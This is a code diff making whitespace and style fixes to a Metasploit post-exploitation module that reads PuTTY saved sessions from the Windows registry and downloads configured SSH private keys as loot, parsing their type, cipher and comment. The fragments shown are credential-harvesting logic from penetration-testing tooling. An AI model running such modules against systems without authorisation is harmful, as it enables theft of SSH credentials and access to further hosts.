@@ -16,7 +16,7 @@ class Metasploit3 < Msf::Post
 
   INTERESTING_KEYS = ['HostName', 'UserName', 'PublicKeyFile', 'PortNumber', 'PortForwardings']
   PAGEANT_REGISTRY_KEY = "HKCU\\Software\\SimonTatham\\PuTTY"
-  PUTTY_PRIVATE_KEY_ANALYSIS = ['Name','HostName','UserName','PublicKeyFile','Type','Cipher','Comment']
+  PUTTY_PRIVATE_KEY_ANALYSIS = ['Name', 'HostName', 'UserName', 'PublicKeyFile', 'Type', 'Cipher', 'Comment']
 
   def initialize(info = {})
     super(update_info(info,
@@ -94,8 +94,8 @@ class Metasploit3 < Msf::Post
 
     print_line
     print_line results_table.to_s
-    #stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Saved Sessions List")
-    #print_status("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
+    # stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Saved Sessions List")
+    # print_status("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
   end
 
   def get_stored_host_key_details(allkeys)
@@ -187,23 +187,23 @@ class Metasploit3 < Msf::Post
             private_key['Type'] = 'ssh1'
             private_key['Comment'] = '-'
             if ppk[33] == "\x00"
-                private_key['Cipher'] = 'none'
+              private_key['Cipher'] = 'none'
             elsif ppk[33] == "\x03"
-                private_key['Cipher'] = '3DES'
+              private_key['Cipher'] = '3DES'
             else
-                private_key['Cipher'] = '(Unrecognised)'
+              private_key['Cipher'] = '(Unrecognised)'
             end
           elsif rx = /^PuTTY-User-Key-File-2:\sssh-(?<keytype>rsa|dss)[\r\n]/.match(ppk.to_s)
             # This is an SSH2 header
             private_key['Type'] = "ssh2 (#{rx[:keytype]})"
             if rx = /^Encryption:\s(?<cipher>[-a-z0-9]+?)[\r\n]/.match(ppk.to_s)
-                private_key['Cipher'] = rx[:cipher]
+              private_key['Cipher'] = rx[:cipher]
             else
-                private_key['Cipher'] = '(Unrecognised)'
+              private_key['Cipher'] = '(Unrecognised)'
             end
 
             if rx = /^Comment:\s(?<comment>.+?)[\r\n]/.match(ppk.to_s)
-                private_key['Comment'] = rx[:comment]
+              private_key['Comment'] = rx[:comment]
             end
           end
           private_key_summary << private_key
@@ -236,9 +236,9 @@ class Metasploit3 < Msf::Post
       # If the private key file has been configured, retrieve it and save it to loot
       print_status("Downloading private keys...")
       private_key_info = grab_private_keys(all_saved_sessions)
-      if (!private_key_info.nil? && !private_key_info.empty?)
+      if !private_key_info.nil? && !private_key_info.empty?
         print_line
-        display_private_key_analysis(private_key_info) 
+        display_private_key_analysis(private_key_info)
       end
     end
 
